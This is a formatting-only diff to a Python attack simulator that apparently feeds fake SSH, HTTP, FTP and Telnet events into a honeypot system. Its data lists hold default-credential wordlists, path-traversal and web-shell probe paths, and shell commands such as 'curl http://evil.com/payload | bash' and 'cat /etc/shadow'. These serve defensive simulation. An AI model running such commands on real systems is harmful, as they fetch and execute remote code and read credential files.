@@ -21,39 +21,108 @@ from models import HoneypotEvent
 # ---------------------------------------------------------------------------
 
 _USERNAMES = [
-    "root", "admin", "ubuntu", "pi", "test", "oracle", "postgres",
-    "guest", "ftpuser", "www-data", "mysql", "user", "support",
-    "deploy", "ansible", "vagrant", "ec2-user", "centos", "git",
-    "jenkins", "nagios", "backup", "operator", "service",
+    "root",
+    "admin",
+    "ubuntu",
+    "pi",
+    "test",
+    "oracle",
+    "postgres",
+    "guest",
+    "ftpuser",
+    "www-data",
+    "mysql",
+    "user",
+    "support",
+    "deploy",
+    "ansible",
+    "vagrant",
+    "ec2-user",
+    "centos",
+    "git",
+    "jenkins",
+    "nagios",
+    "backup",
+    "operator",
+    "service",
 ]
 
 _PASSWORDS = [
-    "123456", "password", "admin", "root", "toor", "12345678",
-    "qwerty", "letmein", "welcome", "monkey", "dragon", "master",
-    "login", "abc123", "passw0rd", "1234", "test", "guest",
-    "shadow", "P@ssw0rd", "changeme", "default", "admin123",
-    "password1", "iloveyou", "trustno1", "batman", "access",
+    "123456",
+    "password",
+    "admin",
+    "root",
+    "toor",
+    "12345678",
+    "qwerty",
+    "letmein",
+    "welcome",
+    "monkey",
+    "dragon",
+    "master",
+    "login",
+    "abc123",
+    "passw0rd",
+    "1234",
+    "test",
+    "guest",
+    "shadow",
+    "P@ssw0rd",
+    "changeme",
+    "default",
+    "admin123",
+    "password1",
+    "iloveyou",
+    "trustno1",
+    "batman",
+    "access",
 ]
 
 # Persistent attackers + random scanners
 _SOURCE_IPS = [
     # "Persistent" attackers (higher probability)
-    "185.220.101.42", "45.141.84.12", "193.42.33.100",
+    "185.220.101.42",
+    "45.141.84.12",
+    "193.42.33.100",
     # Occasional scanners
-    "103.25.17.88", "91.240.118.50", "194.26.29.15",
-    "178.128.42.199", "167.99.200.31", "64.225.80.5",
-    "159.65.144.3", "206.189.25.100", "142.93.167.88",
+    "103.25.17.88",
+    "91.240.118.50",
+    "194.26.29.15",
+    "178.128.42.199",
+    "167.99.200.31",
+    "64.225.80.5",
+    "159.65.144.3",
+    "206.189.25.100",
+    "142.93.167.88",
     # Internal lab IPs
-    "10.10.10.100", "10.10.10.105", "192.168.1.50",
+    "10.10.10.100",
+    "10.10.10.105",
+    "192.168.1.50",
 ]
 
 _HTTP_PATHS = [
-    "/", "/wp-login.php", "/wp-admin", "/admin", "/phpmyadmin",
-    "/phpMyAdmin", "/.env", "/api/v1/users", "/config.php",
-    "/../../../etc/passwd", "/shell.php", "/wp-content/uploads/shell.php",
-    "/robots.txt", "/sitemap.xml", "/.git/config", "/backup.sql",
-    "/admin/login", "/api/v1/auth/token", "/server-status",
-    "/cgi-bin/test.cgi", "/.htaccess", "/wp-json/wp/v2/users",
+    "/",
+    "/wp-login.php",
+    "/wp-admin",
+    "/admin",
+    "/phpmyadmin",
+    "/phpMyAdmin",
+    "/.env",
+    "/api/v1/users",
+    "/config.php",
+    "/../../../etc/passwd",
+    "/shell.php",
+    "/wp-content/uploads/shell.php",
+    "/robots.txt",
+    "/sitemap.xml",
+    "/.git/config",
+    "/backup.sql",
+    "/admin/login",
+    "/api/v1/auth/token",
+    "/server-status",
+    "/cgi-bin/test.cgi",
+    "/.htaccess",
+    "/wp-json/wp/v2/users",
 ]
 
 _HTTP_USER_AGENTS = [
@@ -71,9 +140,19 @@ _HTTP_USER_AGENTS = [
 _FTP_COMMANDS = ["USER", "PASS", "LIST", "RETR backup.tar.gz", "CWD /data", "QUIT"]
 
 _TELNET_COMMANDS = [
-    "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la",
-    "ifconfig", "ps aux", "w", "cat /etc/shadow", "wget http://evil.com/shell.sh",
-    "curl http://evil.com/payload | bash", "history", "crontab -l",
+    "whoami",
+    "id",
+    "uname -a",
+    "cat /etc/passwd",
+    "ls -la",
+    "ifconfig",
+    "ps aux",
+    "w",
+    "cat /etc/shadow",
+    "wget http://evil.com/shell.sh",
+    "curl http://evil.com/payload | bash",
+    "history",
+    "crontab -l",
 ]
 
 
@@ -128,37 +207,61 @@ class AttackSimulator:
         port = random.randint(40000, 65000)
         session_id = self._next_session()
 
-        self._emit(HoneypotEvent(
-            protocol="ssh", src_ip=ip, src_port=port, dst_port=2222,
-            event_type="connection", session_id=session_id,
-            metadata={"client_version": "SSH-2.0-libssh2_1.10.0"},
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="ssh",
+                src_ip=ip,
+                src_port=port,
+                dst_port=2222,
+                event_type="connection",
+                session_id=session_id,
+                metadata={"client_version": "SSH-2.0-libssh2_1.10.0"},
+            )
+        )
 
         # 1-3 credential attempts per session
         for _ in range(random.randint(1, 3)):
-            self._emit(HoneypotEvent(
-                protocol="ssh", src_ip=ip, src_port=port, dst_port=2222,
-                event_type="credential_attempt",
-                credentials={
-                    "username": random.choice(_USERNAMES),
-                    "password": random.choice(_PASSWORDS),
-                },
-                session_id=session_id,
-                metadata={"auth_method": "password"},
-            ))
+            self._emit(
+                HoneypotEvent(
+                    protocol="ssh",
+                    src_ip=ip,
+                    src_port=port,
+                    dst_port=2222,
+                    event_type="credential_attempt",
+                    credentials={
+                        "username": random.choice(_USERNAMES),
+                        "password": random.choice(_PASSWORDS),
+                    },
+                    session_id=session_id,
+                    metadata={"auth_method": "password"},
+                )
+            )
 
         # Sometimes the attacker gets a shell
         if random.random() < 0.3:
             for cmd in random.sample(_TELNET_COMMANDS, k=random.randint(1, 4)):
-                self._emit(HoneypotEvent(
-                    protocol="ssh", src_ip=ip, src_port=port, dst_port=2222,
-                    event_type="command", payload=cmd, session_id=session_id,
-                ))
+                self._emit(
+                    HoneypotEvent(
+                        protocol="ssh",
+                        src_ip=ip,
+                        src_port=port,
+                        dst_port=2222,
+                        event_type="command",
+                        payload=cmd,
+                        session_id=session_id,
+                    )
+                )
 
-        self._emit(HoneypotEvent(
-            protocol="ssh", src_ip=ip, src_port=port, dst_port=2222,
-            event_type="disconnect", session_id=session_id,
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="ssh",
+                src_ip=ip,
+                src_port=port,
+                dst_port=2222,
+                event_type="disconnect",
+                session_id=session_id,
+            )
+        )
 
     def _http_probe(self) -> None:
         """Simulate HTTP scanning / exploitation attempts."""
@@ -174,23 +277,35 @@ class AttackSimulator:
             "user_agent": random.choice(_HTTP_USER_AGENTS),
         }
 
-        self._emit(HoneypotEvent(
-            protocol="http", src_ip=ip, src_port=port, dst_port=8080,
-            event_type="request", payload=f"{method} {path}",
-            metadata=metadata, session_id=session_id,
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="http",
+                src_ip=ip,
+                src_port=port,
+                dst_port=8080,
+                event_type="request",
+                payload=f"{method} {path}",
+                metadata=metadata,
+                session_id=session_id,
+            )
+        )
 
         if method == "POST" and path == "/wp-login.php":
-            self._emit(HoneypotEvent(
-                protocol="http", src_ip=ip, src_port=port, dst_port=8080,
-                event_type="credential_attempt",
-                credentials={
-                    "username": random.choice(_USERNAMES[:5]),
-                    "password": random.choice(_PASSWORDS),
-                },
-                session_id=session_id,
-                metadata={"form": "wp-login"},
-            ))
+            self._emit(
+                HoneypotEvent(
+                    protocol="http",
+                    src_ip=ip,
+                    src_port=port,
+                    dst_port=8080,
+                    event_type="credential_attempt",
+                    credentials={
+                        "username": random.choice(_USERNAMES[:5]),
+                        "password": random.choice(_PASSWORDS),
+                    },
+                    session_id=session_id,
+                    metadata={"form": "wp-login"},
+                )
+            )
 
     def _ftp_attempt(self) -> None:
         """Simulate FTP login and browsing attempts."""
@@ -198,33 +313,57 @@ class AttackSimulator:
         port = random.randint(40000, 65000)
         session_id = self._next_session()
 
-        self._emit(HoneypotEvent(
-            protocol="ftp", src_ip=ip, src_port=port, dst_port=2121,
-            event_type="connection", session_id=session_id,
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="ftp",
+                src_ip=ip,
+                src_port=port,
+                dst_port=2121,
+                event_type="connection",
+                session_id=session_id,
+            )
+        )
 
         username = random.choice(_USERNAMES)
         password = random.choice(_PASSWORDS)
-        self._emit(HoneypotEvent(
-            protocol="ftp", src_ip=ip, src_port=port, dst_port=2121,
-            event_type="credential_attempt",
-            credentials={"username": username, "password": password},
-            session_id=session_id,
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="ftp",
+                src_ip=ip,
+                src_port=port,
+                dst_port=2121,
+                event_type="credential_attempt",
+                credentials={"username": username, "password": password},
+                session_id=session_id,
+            )
+        )
 
         # Some attackers issue commands after login
         if random.random() < 0.5:
             cmds = random.sample(_FTP_COMMANDS[2:], k=random.randint(1, 3))
             for cmd in cmds:
-                self._emit(HoneypotEvent(
-                    protocol="ftp", src_ip=ip, src_port=port, dst_port=2121,
-                    event_type="command", payload=cmd, session_id=session_id,
-                ))
+                self._emit(
+                    HoneypotEvent(
+                        protocol="ftp",
+                        src_ip=ip,
+                        src_port=port,
+                        dst_port=2121,
+                        event_type="command",
+                        payload=cmd,
+                        session_id=session_id,
+                    )
+                )
 
-        self._emit(HoneypotEvent(
-            protocol="ftp", src_ip=ip, src_port=port, dst_port=2121,
-            event_type="disconnect", session_id=session_id,
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="ftp",
+                src_ip=ip,
+                src_port=port,
+                dst_port=2121,
+                event_type="disconnect",
+                session_id=session_id,
+            )
+        )
 
     def _telnet_login(self) -> None:
         """Simulate Telnet brute-force and post-login activity."""
@@ -232,29 +371,53 @@ class AttackSimulator:
         port = random.randint(40000, 65000)
         session_id = self._next_session()
 
-        self._emit(HoneypotEvent(
-            protocol="telnet", src_ip=ip, src_port=port, dst_port=2323,
-            event_type="connection", session_id=session_id,
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="telnet",
+                src_ip=ip,
+                src_port=port,
+                dst_port=2323,
+                event_type="connection",
+                session_id=session_id,
+            )
+        )
 
-        self._emit(HoneypotEvent(
-            protocol="telnet", src_ip=ip, src_port=port, dst_port=2323,
-            event_type="credential_attempt",
-            credentials={
-                "username": random.choice(_USERNAMES),
-                "password": random.choice(_PASSWORDS),
-            },
-            session_id=session_id,
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="telnet",
+                src_ip=ip,
+                src_port=port,
+                dst_port=2323,
+                event_type="credential_attempt",
+                credentials={
+                    "username": random.choice(_USERNAMES),
+                    "password": random.choice(_PASSWORDS),
+                },
+                session_id=session_id,
+            )
+        )
 
         if random.random() < 0.4:
             for cmd in random.sample(_TELNET_COMMANDS, k=random.randint(1, 5)):
-                self._emit(HoneypotEvent(
-                    protocol="telnet", src_ip=ip, src_port=port, dst_port=2323,
-                    event_type="command", payload=cmd, session_id=session_id,
-                ))
+                self._emit(
+                    HoneypotEvent(
+                        protocol="telnet",
+                        src_ip=ip,
+                        src_port=port,
+                        dst_port=2323,
+                        event_type="command",
+                        payload=cmd,
+                        session_id=session_id,
+                    )
+                )
 
-        self._emit(HoneypotEvent(
-            protocol="telnet", src_ip=ip, src_port=port, dst_port=2323,
-            event_type="disconnect", session_id=session_id,
-        ))
+        self._emit(
+            HoneypotEvent(
+                protocol="telnet",
+                src_ip=ip,
+                src_port=port,
+                dst_port=2323,
+                event_type="disconnect",
+                session_id=session_id,
+            )
+        )
